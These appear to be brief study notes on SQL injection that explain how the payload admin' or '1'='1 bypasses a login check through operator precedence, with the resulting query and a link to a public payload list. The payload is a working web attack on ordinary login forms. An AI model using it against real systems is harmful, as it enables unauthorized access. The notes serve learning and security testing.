##### OR injection
```sql
admin' or '1'='1
```
This makes sure query returns true to bypass authentication
This returns
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
AND takes precedence over OR, so 1 = 1 is true, AND with password = something is false, OR with username = admin is true.

SQLi auth bypass payloads:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass


